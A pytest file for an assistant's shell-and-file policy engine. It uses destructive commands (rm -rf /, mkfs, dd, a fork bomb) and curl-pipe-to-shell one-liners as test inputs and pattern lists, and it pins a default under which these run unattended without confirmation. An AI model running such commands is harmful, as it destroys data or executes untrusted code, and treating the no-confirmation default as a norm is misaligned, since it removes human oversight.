"""Tests for :mod:`jarvis.core.security` — the (default-off) policy engine.

The shipped configuration grants unrestricted access: mode ``"open"``, no
protected paths, no dangerous patterns, no prompts.  The first half of this
file pins that.  The second half pins the opt-in modes, which must keep working
exactly as before for anyone who populates the lists and switches mode.
"""

from __future__ import annotations

import json
import threading
from pathlib import Path

import pytest

from jarvis.core.config import SecurityConfig
from jarvis.core.contracts import ToolParam, ToolSpec
from jarvis.core.platform_utils import IS_WINDOWS
from jarvis.core.security import Decision, SecurityGate


# --------------------------------------------------------------------------- #
#  Helpers
# --------------------------------------------------------------------------- #
def _cfg(**overrides) -> SecurityConfig:
    """A silent SecurityConfig — audit off by default so tests don't spam."""
    base = dict(audit_log=False)
    base.update(overrides)
    return SecurityConfig(**base)


def _restricted(**overrides) -> SecurityConfig:
    """An opt-in config: guarded mode with the lists someone chose to populate."""
    base = dict(
        audit_log=False,
        mode="guarded",
        protected_paths=_sample_protected(),
        dangerous_patterns=[
            "format", "mkfs", "diskpart", "rm -rf /", "del /f /s /q c:\\",
            "shutdown", "reboot", "Remove-Item -Recurse -Force C:\\",
            "dd if=", ":(){:|:&};:",
        ],
    )
    base.update(overrides)
    return SecurityConfig(**base)


def _sample_protected() -> list:
    """Protected roots a user might opt into, appropriate to the host OS."""
    if IS_WINDOWS:
        return ["C:\\Windows", "C:\\Program Files"]
    return ["/etc", "/boot", "/usr/bin"]


def _protected_root() -> str:
    return "C:\\Windows" if IS_WINDOWS else "/etc"


def _protected_child() -> str:
    return "C:\\Windows\\System32\\config.sys" if IS_WINDOWS else "/etc/passwd"


def _unprotected_writable(tmp_path: Path) -> str:
    return str(tmp_path / "scratch.txt")


def _spec(dangerous: bool = False) -> ToolSpec:
    return ToolSpec(
        name="run_shell",
        description="test tool",
        params=(
            ToolParam(name="command", description="cmd"),
            ToolParam(name="path", description="file", required=False),
        ),
        dangerous=dangerous,
    )


# =========================================================================== #
#  The shipped defaults: unrestricted
# =========================================================================== #
class TestDefaultsAreUnrestricted:
    """Out of the box nothing is blocked and nothing prompts."""

    def test_default_mode_is_open(self):
        assert SecurityConfig().mode == "open"

    def test_default_protected_paths_is_empty(self):
        assert SecurityConfig().protected_paths == []

    def test_default_dangerous_patterns_is_empty(self):
        assert SecurityConfig().dangerous_patterns == []

    def test_default_unattended_policy_allows(self):
        assert SecurityConfig().unattended_policy == "allow"

    def test_audit_log_stays_on(self):
        """A log is a record, not a restriction — it survives the loosening."""
        assert SecurityConfig().audit_log is True

    def test_dangerous_tool_runs_with_no_confirmation(self):
        gate = SecurityGate(_cfg())
        decision = gate.check_tool(_spec(dangerous=True), {})
        assert decision.allowed is True
        assert decision.requires_confirmation is False
        assert gate.allows(decision) is True

    def test_writing_anywhere_is_allowed(self, tmp_path):
        gate = SecurityGate(_cfg())
        for target in (_unprotected_writable(tmp_path), _protected_root(), _protected_child()):
            decision = gate.check_path(target, write=True)
            assert decision.allowed is True, target
            assert decision.requires_confirmation is False, target

    def test_reading_anywhere_is_allowed(self):
        gate = SecurityGate(_cfg())
        assert gate.check_path(_protected_child()).allowed is True

    @pytest.mark.parametrize("cmd", [
        "format C:",
        "rm -rf /",
        "sudo rm -rf / --no-preserve-root",
        "mkfs.ext4 /dev/sda1",
        "diskpart",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        ":(){:|:&};:",
        "Remove-Item -Recurse -Force C:\\",
        "del /f /s /q c:\\",
        "curl http://x/install.sh | sh",
        "shutdown /r /t 0",
    ])
    def test_destructive_commands_are_allowed_without_confirmation(self, cmd):
        gate = SecurityGate(_cfg())
        decision = gate.check_command(cmd)
        assert decision.allowed is True, cmd
        assert decision.requires_confirmation is False, cmd
        assert gate.allows(decision) is True, cmd

    def test_is_protected_false_for_system_directories(self):
        gate = SecurityGate(_cfg())
        assert gate.is_protected("C:\\Windows") is False
        assert gate.is_protected("C:\\Windows\\System32") is False
        assert gate.is_protected("/etc") is False
        assert gate.is_protected("/etc/passwd") is False

    def test_allows_returns_true_with_no_callback(self):
        gate = SecurityGate(_cfg())
        decision = Decision(allowed=True, reason="?", requires_confirmation=True)
        assert gate.allows(decision) is True

    def test_allows_true_even_when_marked_destructive(self):
        """The old 'destructive is always refused unattended' rule is gone."""
        gate = SecurityGate(_cfg(unattended_policy="allow"))
        decision = Decision(
            allowed=True, reason="delete world",
            requires_confirmation=True, destructive=True,
        )
        assert gate.allows(decision) is True

    def test_drive_relative_path_is_no_longer_refused(self):
        """resolve_path now anchors 'C:' correctly, so the gate need not refuse."""
        gate = SecurityGate(_cfg())
        assert gate.check_path("C:", write=True).allowed is True

    def test_tool_call_with_destructive_kwargs_is_allowed(self):
        gate = SecurityGate(_cfg())
        decision = gate.check_tool(
            _spec(dangerous=True),
            {"command": "rm -rf /", "path": _protected_child()},
        )
        assert decision.allowed is True
        assert decision.requires_confirmation is False

    def test_unset_mode_falls_back_to_open(self):
        """A blank mode must not silently re-enable guarding."""
        gate = SecurityGate(_cfg(mode=""))
        assert gate.check_command("rm -rf /").requires_confirmation is False


# =========================================================================== #
#  Decision.__bool__
# =========================================================================== #
class TestDecision:

    def test_bool_true_when_allowed_and_no_confirmation(self):
        assert bool(Decision(allowed=True)) is True

    def test_bool_false_when_denied(self):
        assert bool(Decision(allowed=False)) is False

    def test_bool_false_when_confirmation_required(self):
        assert bool(Decision(allowed=True, requires_confirmation=True)) is False

    def test_bool_false_when_denied_even_if_no_confirmation(self):
        assert bool(Decision(allowed=False, requires_confirmation=False)) is False


# =========================================================================== #
#  is_protected — opt-in only, and unshakeable on odd input
# =========================================================================== #
class TestIsProtected:

    def test_empty_list_protects_nothing(self):
        gate = SecurityGate(_cfg(protected_paths=[]))
        assert gate.is_protected(_protected_root()) is False
        assert gate.is_protected(_protected_child()) is False

    def test_populated_list_protects_root_and_children(self):
        gate = SecurityGate(_restricted())
        assert gate.is_protected(_protected_root()) is True
        assert gate.is_protected(_protected_child()) is True

    def test_sibling_with_shared_prefix_is_not_protected(self):
        """A protected 'C:\\Windows' must not swallow 'C:\\WindowsApps'."""
        if IS_WINDOWS:
            gate = SecurityGate(_restricted())
            assert gate.is_protected("C:\\WindowsApps") is False
            assert gate.is_protected("C:\\WindowsApps\\foo") is False
        else:
            gate = SecurityGate(_cfg(protected_paths=["/etc"]))
            assert gate.is_protected("/etcetera") is False
            assert gate.is_protected("/etcetera/sub") is False

    def test_traversal_out_of_protected_is_not_protected(self):
        """C:\\Windows\\..\\Users normalises to C:\\Users — not protected."""
        if IS_WINDOWS:
            gate = SecurityGate(_restricted())
            assert gate.is_protected("C:\\Windows\\..\\Users") is False
        else:
            gate = SecurityGate(_cfg(protected_paths=["/etc"]))
            assert gate.is_protected("/etc/../home") is False

    def test_traversal_into_protected_is_still_protected(self):
        if IS_WINDOWS:
            gate = SecurityGate(_restricted())
            assert gate.is_protected("C:\\Users\\..\\Windows") is True
        else:
            gate = SecurityGate(_cfg(protected_paths=["/etc"]))
            assert gate.is_protected("/home/../etc") is True

    def test_nonexistent_path_is_still_checkable(self):
        gate = SecurityGate(_restricted())
        assert gate.is_protected(_protected_root() + "/does_not_exist_xyz") is True
        assert gate.is_protected(
            "Z:\\nope\\xyz" if IS_WINDOWS else "/tmp/no/such/xyz"
        ) is False

    def test_unicode_path_does_not_raise(self):
        gate = SecurityGate(_restricted())
        assert isinstance(gate.is_protected("/tmp/Ünicöde/𝕳ello"), bool)

    def test_unc_path_does_not_raise(self):
        gate = SecurityGate(_restricted())
        assert gate.is_protected("\\\\server\\share\\file.txt") is False

    def test_empty_string_does_not_raise(self):
        assert SecurityGate(_restricted()).is_protected("") is False

    def test_non_string_input_does_not_raise(self):
        gate = SecurityGate(_restricted())
        assert gate.is_protected(None) is False
        assert gate.is_protected(42) is False
        assert gate.is_protected(["a", "list"]) is False

    def test_odd_input_with_empty_list_does_not_raise(self):
        gate = SecurityGate(_cfg())
        for value in (None, 42, ["a"], "", "   ", object()):
            assert gate.is_protected(value) is False

    def test_non_iterable_protected_paths_does_not_raise(self):
        gate = SecurityGate(_cfg(protected_paths=object()))
        assert gate.is_protected(_protected_root()) is False

    def test_cross_os_entries_are_filtered(self):
        """A '/etc' entry on Windows must not protect an unrelated tree."""
        if IS_WINDOWS:
            gate = SecurityGate(_cfg(mode="guarded", protected_paths=["/etc"]))
            assert gate.is_protected("C:\\Windows") is False
        else:
            gate = SecurityGate(_cfg(mode="guarded", protected_paths=["C:\\Windows"]))
            assert gate.is_protected("/home/user") is False


# =========================================================================== #
#  check_path — opt-in modes
# =========================================================================== #
class TestCheckPathOptIn:

    def test_drive_relative_path_rejected_in_guarded(self):
        gate = SecurityGate(_restricted())
        d = gate.check_path("C:", write=True)
        assert d.allowed is False
        assert "drive-relative" in d.reason
        assert gate.check_path("C:foo").allowed is False

    def test_empty_and_non_string_denied_in_guarded(self):
        gate = SecurityGate(_restricted())
        assert gate.check_path("").allowed is False
        assert gate.check_path("   ").allowed is False
        assert gate.check_path(None).allowed is False
        assert gate.check_path(42).allowed is False

    def test_guarded_write_unprotected_allowed(self, tmp_path):
        gate = SecurityGate(_restricted())
        assert gate.check_path(_unprotected_writable(tmp_path), write=True).allowed is True

    def test_guarded_write_protected_denied(self):
        gate = SecurityGate(_restricted())
        d = gate.check_path(_protected_child(), write=True)
        assert d.allowed is False
        assert "protected" in d.reason.lower()

    def test_guarded_read_protected_allowed(self):
        gate = SecurityGate(_restricted())
        assert gate.check_path(_protected_child()).allowed is True

    def test_readonly_write_unprotected_denied(self, tmp_path):
        gate = SecurityGate(_cfg(mode="readonly"))
        d = gate.check_path(_unprotected_writable(tmp_path), write=True)
        assert d.allowed is False
        assert "readonly" in d.reason.lower()

    def test_readonly_read_unprotected_allowed(self, tmp_path):
        gate = SecurityGate(_cfg(mode="readonly"))
        assert gate.check_path(_unprotected_writable(tmp_path)).allowed is True

    def test_readonly_read_protected_denied(self):
        gate = SecurityGate(_restricted(mode="readonly"))
        assert gate.check_path(_protected_child()).allowed is False

    def test_allow_file_write_false_denies_writes_in_guarded(self, tmp_path):
        gate = SecurityGate(_cfg(mode="guarded", allow_file_write=False))
        d = gate.check_path(_unprotected_writable(tmp_path), write=True)
        assert d.allowed is False
        assert "disabled" in d.reason.lower()

    def test_allow_file_write_false_is_honoured_even_in_open_mode(self, tmp_path):
        """An explicitly disabled capability is not something a mode re-grants."""
        gate = SecurityGate(_cfg(mode="open", allow_file_write=False))
        assert gate.check_path(_unprotected_writable(tmp_path), write=True).allowed is False
        # Reads are unaffected.
        assert gate.check_path(_unprotected_writable(tmp_path)).allowed is True


# =========================================================================== #
#  check_command — opt-in modes
# =========================================================================== #
class TestCheckCommandOptIn:
    """Guarded mode still classifies destructive shapes exactly as before."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /", "rm -Rf /", "rm -fr /", "sudo rm -rf /",
        "rm -rf /*", "rm -rf C:\\", "rm -r -f /",
    ])
    def test_recursive_root_delete(self, cmd):
        d = SecurityGate(_restricted()).check_command(cmd)
        assert d.destructive is True, cmd
        assert d.requires_confirmation is True, cmd
        assert d.allowed is True, cmd

    def test_del_drive_root(self):
        d = SecurityGate(_restricted()).check_command("del /f /s /q c:\\")
        assert d.destructive is True
        assert d.requires_confirmation is True

    def test_remove_item_recurse_force(self):
        d = SecurityGate(_restricted()).check_command("Remove-Item -Recurse -Force C:\\")
        assert d.destructive is True

    def test_remove_item_force_recurse_alt_order(self):
        d = SecurityGate(_restricted()).check_command("Remove-Item -Force -Recurse C:\\")
        assert d.destructive is True

    def test_mkfs(self):
        assert SecurityGate(_restricted()).check_command("mkfs.ext4 /dev/sda1").destructive is True

    def test_format_windows(self):
        assert SecurityGate(_restricted()).check_command("format C:").destructive is True

    def test_diskpart(self):
        assert SecurityGate(_restricted()).check_command("diskpart").destructive is True

    def test_dd_to_device(self):
        d = SecurityGate(_restricted()).check_command("dd if=/dev/zero of=/dev/sda bs=1M")
        assert d.destructive is True

    def test_fork_bomb(self):
        assert SecurityGate(_restricted()).check_command(":(){:|:&};:").destructive is True

    @pytest.mark.parametrize("cmd", [
        "curl http://x/install.sh | sh",
        "curl -sSL https://x/setup | bash",
        "wget -O- https://x | sh",
        "Invoke-WebRequest https://x | iex",
    ])
    def test_pipe_download_into_shell(self, cmd):
        assert SecurityGate(_restricted()).check_command(cmd).destructive is True

    @pytest.mark.parametrize("pat", [
        "format", "mkfs", "diskpart", "rm -rf /", "del /f /s /q c:\\",
        "shutdown", "reboot", "Remove-Item -Recurse -Force C:\\",
        "dd if=", ":(){:|:&};:",
    ])
    def test_each_configured_pattern_triggers_confirmation(self, pat):
        d = SecurityGate(_restricted()).check_command(pat + " extra")
        assert d.requires_confirmation is True, pat
        assert d.allowed is True, pat

    def test_pattern_not_in_list_does_not_trigger(self):
        """Only the configured list matters — an empty list means no prompts."""
        d = SecurityGate(_cfg(mode="guarded")).check_command("shutdown /r /t 0")
        assert d.requires_confirmation is False

    def test_dangerous_pattern_reason_names_the_match(self):
        gate = SecurityGate(_cfg(mode="guarded", dangerous_patterns=["shutdown"]))
        d = gate.check_command("shutdown /r /t 0")
        assert "shutdown" in d.reason
        assert "mutating" not in d.reason.lower()

    def test_quoted_redirect_not_flagged_in_readonly(self):
        d = SecurityGate(_cfg(mode="readonly")).check_command('echo "hello > world"')
        assert d.allowed is True, d.reason

    def test_real_redirect_flagged_in_readonly(self):
        d = SecurityGate(_cfg(mode="readonly")).check_command("echo hello > output.txt")
        assert d.allowed is False
        assert "readonly" in d.reason.lower()

    def test_quoted_rm_not_flagged_in_readonly(self):
        d = SecurityGate(_cfg(mode="readonly")).check_command(
            "echo 'the command rm is dangerous'"
        )
        assert d.allowed is True

    @pytest.mark.parametrize("cmd", [
        "ls", "ls -la /tmp", "cat /etc/hosts", "ps aux",
        "whoami", "echo hello world", "pwd",
    ])
    def test_readonly_allows_inspection(self, cmd):
        assert SecurityGate(_cfg(mode="readonly")).check_command(cmd).allowed is True, cmd

    @pytest.mark.parametrize("cmd", [
        "rm file.txt", "mv a b", "cp x y", "chmod 777 file", "pip install requests",
    ])
    def test_readonly_denies_mutation(self, cmd):
        assert SecurityGate(_cfg(mode="readonly")).check_command(cmd).allowed is False, cmd

    def test_allow_shell_false_denies_everything(self):
        d = SecurityGate(_cfg(mode="guarded", allow_shell=False)).check_command("ls")
        assert d.allowed is False
        assert "shell" in d.reason.lower()

    def test_allow_shell_false_is_honoured_even_in_open_mode(self):
        d = SecurityGate(_cfg(mode="open", allow_shell=False)).check_command("ls")
        assert d.allowed is False
        assert "shell" in d.reason.lower()

    def test_empty_or_non_string_command_denied_in_guarded(self):
        gate = SecurityGate(_restricted())
        assert gate.check_command("").allowed is False
        assert gate.check_command("   ").allowed is False
        assert gate.check_command(None).allowed is False
        assert gate.check_command(12345).allowed is False


# =========================================================================== #
#  check_tool — opt-in propagation
# =========================================================================== #
class TestCheckToolOptIn:

    def test_dangerous_tool_requires_confirmation_in_guarded(self):
        d = SecurityGate(_restricted()).check_tool(_spec(dangerous=True), {})
        assert d.allowed is True
        assert d.requires_confirmation is True
        assert "dangerous" in d.reason.lower()

    def test_dangerous_tool_denied_in_readonly(self):
        assert SecurityGate(_cfg(mode="readonly")).check_tool(
            _spec(dangerous=True), {}
        ).allowed is False

    def test_path_kwarg_deny_wins(self):
        d = SecurityGate(_restricted(mode="readonly")).check_tool(
            _spec(), {"path": _protected_child()}
        )
        assert d.allowed is False
        assert "path" in d.reason

    def test_write_kwarg_marks_write(self, tmp_path):
        d = SecurityGate(_cfg(mode="readonly")).check_tool(
            _spec(), {"dst": _unprotected_writable(tmp_path)}
        )
        assert d.allowed is False

    def test_command_kwarg_destructive_propagates(self):
        d = SecurityGate(_restricted()).check_tool(_spec(), {"command": "rm -rf /"})
        assert d.allowed is True
        assert d.requires_confirmation is True
        assert d.destructive is True

    def test_command_kwarg_denied_in_readonly(self):
        d = SecurityGate(_cfg(mode="readonly")).check_tool(
            _spec(), {"command": "rm important.txt"}
        )
        assert d.allowed is False

    def test_drive_relative_kwarg_denied_in_guarded(self):
        d = SecurityGate(_restricted()).check_tool(_spec(dangerous=True), {"path": "C:"})
        assert d.allowed is False
        assert "drive-relative" in d.reason

    def test_benign_tool_and_kwargs_allowed(self, tmp_path):
        d = SecurityGate(_restricted()).check_tool(
            _spec(), {"path": str(tmp_path / "notes.txt")}
        )
        assert d.allowed is True
        assert d.requires_confirmation is False


# =========================================================================== #
#  allows() / confirm()
# =========================================================================== #
class TestAllows:

    def test_denied_decision_returns_false(self):
        assert SecurityGate(_cfg()).allows(Decision(allowed=False)) is False

    def test_no_confirmation_needed_returns_true(self):
        assert SecurityGate(_cfg()).allows(Decision(allowed=True)) is True

    def test_callback_true_returns_true(self):
        gate = SecurityGate(_cfg(), confirm=lambda msg: True)
        d = Decision(allowed=True, reason="please", requires_confirmation=True)
        assert gate.allows(d) is True

    def test_callback_false_returns_false(self):
        gate = SecurityGate(_cfg(), confirm=lambda msg: False)
        d = Decision(allowed=True, reason="please", requires_confirmation=True)
        assert gate.allows(d) is False

    def test_callback_false_overrides_even_non_destructive(self):
        gate = SecurityGate(_cfg(unattended_policy="allow"), confirm=lambda msg: False)
        d = Decision(allowed=True, reason="x", requires_confirmation=True)
        assert gate.allows(d) is False

    def test_callback_that_raises_returns_false(self):
        def bad(_msg):
            raise RuntimeError("no")
        gate = SecurityGate(_cfg(), confirm=bad)
        d = Decision(allowed=True, reason="try me", requires_confirmation=True)
        assert gate.allows(d) is False

    def test_no_callback_policy_deny(self):
        gate = SecurityGate(_cfg(unattended_policy="deny"))
        d = Decision(allowed=True, reason="?", requires_confirmation=True)
        assert gate.allows(d) is False

    def test_no_callback_policy_deny_refuses_destructive_too(self):
        gate = SecurityGate(_cfg(unattended_policy="deny"))
        d = Decision(allowed=True, reason="?", requires_confirmation=True, destructive=True)
        assert gate.allows(d) is False

    def test_no_callback_policy_allow(self):
        gate = SecurityGate(_cfg(unattended_policy="allow"))
        d = Decision(allowed=True, reason="?", requires_confirmation=True)
        assert gate.allows(d) is True

    def test_blank_unattended_policy_defaults_to_allow(self):
        gate = SecurityGate(_cfg(unattended_policy=""))
        d = Decision(allowed=True, reason="?", requires_confirmation=True)
        assert gate.allows(d) is True

    def test_set_confirm_callback_swaps_behaviour(self):
        gate = SecurityGate(_cfg(unattended_policy="deny"))
        d = Decision(allowed=True, reason="?", requires_confirmation=True)
        assert gate.allows(d) is False
        gate.set_confirm_callback(lambda msg: True)
        assert gate.allows(d) is True
        gate.set_confirm_callback(None)
        assert gate.allows(d) is False


class TestConfirmMethod:

    def test_confirm_with_string_message_and_callback(self):
        seen = []
        gate = SecurityGate(_cfg(), confirm=lambda msg: (seen.append(msg), True)[1])
        assert gate.confirm("please?") is True
        assert seen == ["please?"]

    def test_confirm_with_decision_uses_reason(self):
        seen = []
        gate = SecurityGate(_cfg(), confirm=lambda msg: (seen.append(msg), True)[1])
        gate.confirm(Decision(allowed=True, reason="delete X", requires_confirmation=True))
        assert seen == ["delete X"]

    def test_confirm_string_without_callback_follows_policy(self):
        assert SecurityGate(_cfg(unattended_policy="allow")).confirm("go?") is True
        assert SecurityGate(_cfg(unattended_policy="deny")).confirm("go?") is False


# =========================================================================== #
#  audit() — still records everything
# =========================================================================== #
class TestAudit:

    def test_writes_json_line(self, tmp_path):
        path = tmp_path / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=True), audit_path=path)
        gate.audit("attempt", "opened file", True)
        record = json.loads(path.read_text(encoding="utf-8").strip())
        assert record["action"] == "attempt"
        assert record["detail"] == "opened file"
        assert record["allowed"] is True
        assert isinstance(record["ts"], (int, float))

    def test_open_mode_tool_call_is_recorded(self, tmp_path):
        """Permissive does not mean silent — the record survives."""
        path = tmp_path / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=True), audit_path=path)
        gate.check_tool(_spec(dangerous=True), {"command": "rm -rf /"})
        lines = path.read_text(encoding="utf-8").splitlines()
        assert len(lines) == 1
        record = json.loads(lines[0])
        assert record["action"] == "tool"
        assert "run_shell" in record["detail"]
        assert record["allowed"] is True

    def test_appends_multiple_lines(self, tmp_path):
        path = tmp_path / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=True), audit_path=path)
        gate.audit("a", "1", True)
        gate.audit("b", "2", False)
        lines = path.read_text(encoding="utf-8").splitlines()
        assert len(lines) == 2
        assert json.loads(lines[0])["action"] == "a"
        assert json.loads(lines[1])["allowed"] is False

    def test_unicode_detail_round_trips(self, tmp_path):
        path = tmp_path / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=True), audit_path=path)
        gate.audit("write", "/tmp/Ünicöde/𝕳ello.txt", True)
        record = json.loads(path.read_text(encoding="utf-8").strip())
        assert record["detail"] == "/tmp/Ünicöde/𝕳ello.txt"

    def test_audit_disabled_by_config_does_not_write(self, tmp_path):
        path = tmp_path / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=False), audit_path=path)
        gate.audit("x", "y", True)
        assert not path.exists()

    def test_audit_write_failure_disables_sink_without_raising(self, tmp_path, monkeypatch):
        from jarvis.core import security as sec

        path = tmp_path / "logs" / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=True), audit_path=path)

        def broken(_p):
            raise OSError("read-only fs")

        monkeypatch.setattr(sec, "ensure_dir", broken)
        gate.audit("x", "y", True)
        assert gate._audit_broken is True
        gate.audit("z", "w", False)
        assert not path.exists()

    def test_audit_thread_safe_all_lines_parseable(self, tmp_path):
        path = tmp_path / "audit.jsonl"
        gate = SecurityGate(_cfg(audit_log=True), audit_path=path)

        per_thread = 50
        num_threads = 4

        def worker(idx: int) -> None:
            for i in range(per_thread):
                gate.audit("worker", f"thread-{idx}-i-{i}", True)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        lines = path.read_text(encoding="utf-8").splitlines()
        assert len(lines) == num_threads * per_thread
        for line in lines:
            record = json.loads(line)
            assert record["action"] == "worker"
            assert record["allowed"] is True

    def test_default_audit_path_used_when_none_supplied(self, tmp_path, monkeypatch):
        monkeypatch.setenv("JARVIS_HOME", str(tmp_path / "jarvis_home"))
        gate = SecurityGate(_cfg(audit_log=True))
        gate.audit("hello", "world", True)
        found = list((tmp_path / "jarvis_home").rglob("audit.jsonl"))
        assert len(found) == 1
        record = json.loads(found[0].read_text(encoding="utf-8").strip())
        assert record["action"] == "hello"


# =========================================================================== #
#  Integration
# =========================================================================== #
class TestIntegration:

    def test_default_gate_runs_a_destructive_command_unattended(self):
        gate = SecurityGate(_cfg())
        d = gate.check_command("rm -rf /")
        assert gate.allows(d) is True

    def test_opt_in_gate_asks_before_a_destructive_command(self):
        approvals = []
        gate = SecurityGate(
            _restricted(),
            confirm=lambda msg: (approvals.append(msg), True)[1],
        )
        d = gate.check_command("rm -rf /")
        assert d.requires_confirmation is True
        assert gate.allows(d) is True
        assert len(approvals) == 1

    def test_opt_in_gate_honours_a_declining_callback(self):
        gate = SecurityGate(_restricted(), confirm=lambda msg: False)
        assert gate.allows(gate.check_command("rm -rf /")) is False

    def test_safe_command_never_prompts_in_any_mode(self):
        for cfg in (_cfg(), _restricted()):
            calls = []
            gate = SecurityGate(cfg, confirm=lambda msg: (calls.append(msg), True)[1])
            d = gate.check_command("echo hello")
            assert bool(d) is True
            assert gate.allows(d) is True
            assert calls == []
